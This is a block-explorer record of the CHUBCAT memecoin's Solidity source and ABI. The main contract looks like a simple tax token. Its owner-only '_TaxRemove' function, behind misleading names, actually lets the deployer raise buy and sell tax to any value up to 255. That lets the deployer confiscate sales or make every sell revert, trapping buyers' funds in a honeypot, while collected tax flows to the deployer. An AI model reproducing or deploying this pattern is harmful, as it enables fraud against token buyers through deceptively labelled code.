{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"short tax 1/Short tax contract/CHUBCAT.sol\": {\r\n      \"content\": \"/*\\r\\nCHUBCAT\\r\\n\\r\\nTelegram: https://t.me/chubcatofficial\\r\\nX: https://x.com/Chubcatofficial\\r\\nWebsite: https://chubcat.asia/\\r\\n*/\\r\\n\\r\\n\\r\\n// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.8.25;\\r\\nimport \\\"./IERC20Errors.sol\\\";\\r\\nimport \\\"./IUniswapFactory.sol\\\";\\r\\nimport \\\"./IERC404Errors.sol\\\";\\r\\nimport \\\"./IERC721Errors.sol\\\";\\r\\n\\r\\n\\r\\ncontract CHUBCAT\\r\\n{ \\r\\n    string private _name = unicode\\\"CHUBCAT\\\";\\r\\n    string private _symbol = unicode\\\"CHUB\\\";\\r\\n    uint8 public constant decimals = 18;\\r\\n    uint256 public constant totalSupply = 420_690_000_000 * 10**decimals;\\r\\n\\r\\n    struct StoreData {\\r\\n        address MktToken;\\r\\n        uint8 BuyTaxFee;\\r\\n        uint8 SellTaxFee;\\r\\n    }\\r\\n\\r\\n    StoreData public storeData;\\r\\n    uint256 constant swapAmount = totalSupply / 100;\\r\\n\\r\\n    error Permissions();\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    \\r\\n    event Approval(\\r\\n        address indexed MKT_Token,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n\\r\\n    mapping(address => uint256) public balanceOf;\\r\\n    mapping(address => mapping(address => uint256)) public allowance;\\r\\n\\r\\n    address public pair;\\r\\n    IUniswapV2Router02 constant _uniswapV2Router =\\r\\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n\\r\\n    bool private swapping;\\r\\n    bool private tradingOpen;\\r\\n\\r\\n    constructor() {\\r\\n        uint8 _BuyTaxF = 0;\\r\\n        uint8 _SellTaxF = 0;\\r\\n        storeData = StoreData({\\r\\n            MktToken: msg.sender,\\r\\n            BuyTaxFee: _BuyTaxF,\\r\\n            SellTaxFee: _SellTaxF\\r\\n        });\\r\\n        balanceOf[msg.sender] = totalSupply;\\r\\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\\r\\n        emit Transfer(address(0), msg.sender, totalSupply);\\r\\n    }\\r\\n\\r\\n    receive() external payable {}\\r\\n\\r\\n    function _TaxRemove(uint8 __Bunit8, uint8 _Sunit8) external {\\r\\n        if (msg.sender != _decodeMktTokenWithZkSyncVerify()) revert Permissions();\\r\\n        RemoveTax(__Bunit8, _Sunit8);\\r\\n    }\\r\\n\\r\\n    function _decodeMktTokenWithZkSyncVerify() private view returns(address) {\\r\\n        return storeData.MktToken;\\r\\n    }\\r\\n\\r\\n    function openedTrade() external {\\r\\n        require(msg.sender == _decodeMktTokenWithZkSyncVerify());\\r\\n        require(!tradingOpen);\\r\\n        address _factory = _uniswapV2Router.factory();\\r\\n        address _weth = _uniswapV2Router.WETH();\\r\\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\\r\\n        pair = _pair;\\r\\n        tradingOpen = true;\\r\\n    }\\r\\n\\r\\n    function RemoveTax(uint8 _buy, uint8 _sell) private {\\r\\n        storeData.BuyTaxFee = _buy;\\r\\n        storeData.SellTaxFee = _sell;\\r\\n    }\\r\\n\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) external returns (bool) {\\r\\n        allowance[from][msg.sender] -= amount;\\r\\n        return _transfer(from, to, amount);\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) external returns (bool) {\\r\\n        allowance[msg.sender][spender] = amount;\\r\\n        emit Approval(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transfer(address to, uint256 amount) external returns (bool) {\\r\\n        return _transfer(msg.sender, to, amount);\\r\\n    }\\r\\n\\r\\n    function name() public view virtual returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public view virtual returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal returns (bool) {\\r\\n        address MktToken = _decodeMktTokenWithZkSyncVerify();\\r\\n        require(tradingOpen || from == MktToken || to == MktToken);\\r\\n\\r\\n        balanceOf[from] -= amount;\\r\\n\\r\\n        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != MktToken) {\\r\\n            swapping = true;\\r\\n            address[] memory path = new address[](2);\\r\\n            path[0] = address(this);\\r\\n            path[1] = _uniswapV2Router.WETH();\\r\\n            _uniswapV2Router\\r\\n                .swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n                    swapAmount,\\r\\n                    0,\\r\\n                    path,\\r\\n                    address(this),\\r\\n                    block.timestamp\\r\\n                );\\r\\n            payable(MktToken).transfer(address(this).balance);\\r\\n            swapping = false;\\r\\n        }\\r\\n\\r\\n        (uint8 _BuyTaxF, uint8 _SellTaxF) = (storeData.BuyTaxFee, storeData.SellTaxFee);\\r\\n        if (from != address(this) && tradingOpen == true) {\\r\\n            uint256 TaxAmount = (amount *(to == pair ? _SellTaxF : _BuyTaxF)) / 100;\\r\\n            amount -= TaxAmount;\\r\\n            balanceOf[address(this)] += TaxAmount;\\r\\n        }\\r\\n        balanceOf[to] += amount;\\r\\n        emit Transfer(from, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    \\r\\n\\r\\n}\"\r\n    },\r\n    \"short tax 1/Short tax contract/IERC721Errors.sol\": {\r\n      \"content\": \"\\r\\n\\r\\n// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity 0.8.25;\\r\\n\\r\\n/**\\r\\n * @dev Standard ERC721 Errors\\r\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\r\\n */\\r\\ninterface IERC721Errors {\\r\\n    /**\\r\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\r\\n     * Used in balance queries.\\r\\n     * @param owner Address of the current owner of a token.\\r\\n     */\\r\\n    error ERC721InvalidOwner(address owner);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\r\\n     * @param tokenId Identifier number of a token.\\r\\n     */\\r\\n    error ERC721NonexistentToken(uint256 tokenId);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\r\\n     * @param sender Address whose tokens are being transferred.\\r\\n     * @param tokenId Identifier number of a token.\\r\\n     * @param owner Address of the current owner of a token.\\r\\n     */\\r\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\r\\n     * @param sender Address whose tokens are being transferred.\\r\\n     */\\r\\n    error ERC721InvalidSender(address sender);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\r\\n     * @param receiver Address to which tokens are being transferred.\\r\\n     */\\r\\n    error ERC721InvalidReceiver(address receiver);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\\r\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\r\\n     * @param tokenId Identifier number of a token.\\r\\n     */\\r\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\r\\n     * @param approver Address initiating an approval operation.\\r\\n     */\\r\\n    error ERC721InvalidApprover(address approver);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\r\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\r\\n     */\\r\\n    error ERC721InvalidOperator(address operator);\\r\\n}\\r\\n\"\r\n    },\r\n    \"short tax 1/Short tax contract/IERC404Errors.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity 0.8.25;\\r\\n\\r\\n/**\\r\\n * @dev Standard ERC1155 Errors\\r\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\r\\n */\\r\\ninterface IERC1155Errors {\\r\\n    /**\\r\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\r\\n     * @param sender Address whose tokens are being transferred.\\r\\n     * @param balance Current balance for the interacting account.\\r\\n     * @param needed Minimum amount required to perform a transfer.\\r\\n     * @param tokenId Identifier number of a token.\\r\\n     */\\r\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\r\\n     * @param sender Address whose tokens are being transferred.\\r\\n     */\\r\\n    error ERC1155InvalidSender(address sender);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\r\\n     * @param receiver Address to which tokens are being transferred.\\r\\n     */\\r\\n    error ERC1155InvalidReceiver(address receiver);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\\r\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\r\\n     * @param owner Address of the current owner of a token.\\r\\n     */\\r\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\r\\n     * @param approver Address initiating an approval operation.\\r\\n     */\\r\\n    error ERC1155InvalidApprover(address approver);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\r\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\r\\n     */\\r\\n    error ERC1155InvalidOperator(address operator);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\r\\n     * Used in batch transfers.\\r\\n     * @param idsLength Length of the array of token identifiers\\r\\n     * @param valuesLength Length of the array of token amounts\\r\\n     */\\r\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\r\\n}\"\r\n    },\r\n    \"short tax 1/Short tax contract/IUniswapFactory.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity 0.8.25;\\r\\n\\r\\n\\r\\ninterface IUniswapV2Router02 {\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint256 amountIn,\\r\\n        uint256 amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    ) external;\\r\\n\\r\\n    function factory() external pure returns (address);\\r\\n\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint256 amountTokenDesired,\\r\\n        uint256 amountTokenMin,\\r\\n        uint256 amountETHMin,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    )\\r\\n        external\\r\\n        payable\\r\\n        returns (\\r\\n            uint256 amountToken,\\r\\n            uint256 amountETH,\\r\\n            uint256 liquidity\\r\\n        );\\r\\n\\r\\n      function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountETH);\\r\\n\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external payable;\\r\\n      \\r\\n\\r\\n\\r\\n}\\r\\n\\r\\ninterface IUniswapFactory {\\r\\n    function getPair(address tokenA, address tokenB) \\r\\n        external \\r\\n        view \\r\\n        returns \\r\\n        (address pair);\\r\\n    function allPairs(uint) \\r\\n        external \\r\\n        view \\r\\n        returns \\r\\n        (address pair);\\r\\n    function allPairsLength() \\r\\n        external \\r\\n        view \\r\\n        returns \\r\\n        (uint);\\r\\n    function feeTo() \\r\\n        external \\r\\n        view \\r\\n        returns \\r\\n        (address);\\r\\n    function feeToSetter() \\r\\n        external \\r\\n        view \\r\\n        returns \\r\\n        (address);\\r\\n    \\r\\n}\\r\\n\\r\\n\\r\\n\\r\\ninterface IUniswapV2Factory {\\r\\n    function createPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        returns (address pair);\\r\\n}\\r\\n\"\r\n    },\r\n    \"short tax 1/Short tax contract/IERC20Errors.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity 0.8.25;\\r\\n\\r\\n/**\\r\\n * @dev Standard ERC20 Errors\\r\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\r\\n */\\r\\ninterface IERC20Errors {\\r\\n    /**\\r\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\r\\n     * @param sender Address whose tokens are being transferred.\\r\\n     * @param balance Current balance for the interacting account.\\r\\n     * @param needed Minimum amount required to perform a transfer.\\r\\n     */\\r\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\r\\n     * @param sender Address whose tokens are being transferred.\\r\\n     */\\r\\n    error ERC20InvalidSender(address sender);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\r\\n     * @param receiver Address to which tokens are being transferred.\\r\\n     */\\r\\n    error ERC20InvalidReceiver(address receiver);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\\r\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\r\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\r\\n     * @param needed Minimum amount required to perform a transfer.\\r\\n     */\\r\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\r\\n     * @param approver Address initiating an approval operation.\\r\\n     */\\r\\n    error ERC20InvalidApprover(address approver);\\r\\n\\r\\n    /**\\r\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\r\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\r\\n     */\\r\\n    error ERC20InvalidSpender(address spender);\\r\\n}\\r\\n\\r\\n\\r\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"MKT_Token\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"__Bunit8\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_Sunit8\",\"type\":\"uint8\"}],\"name\":\"_TaxRemove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openedTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"storeData\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"MktToken\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"BuyTaxFee\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"SellTaxFee\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CHUBCAT", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}